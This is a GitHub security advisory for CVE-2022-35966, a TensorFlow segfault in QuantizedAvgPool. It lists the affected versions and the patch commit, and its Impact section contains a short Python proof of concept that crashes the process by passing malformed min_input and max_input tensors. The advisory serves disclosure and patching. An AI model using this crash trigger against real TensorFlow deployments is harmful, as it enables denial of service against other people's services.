# [M] TensorFlow vulnerable to segfault in `QuantizedAvgPool`

## Summary
Severity: Medium
Advisory: GHSA-4w68-4x85-mjj9
CVE: CVE-2022-35966
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-4w68-4x85-mjj9
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizedAvgPool` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = "SAME"
input = tf.constant(1, shape=[1,4,4,2], dtype=tf.quint8)
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedAvgPool(input=input, min_input=min_input, max_input=max_input, ksize=ksize, strides=strides, padding=padding)
```

### Patches
We have patched the issue in GitHub commit [7cdf9d4d2083b739ec81cfdace546b0c99f50622](https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4w68-4x85-mjj9
- https://nvd.nist.gov/vuln/detail/CVE-2022-35966
- https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
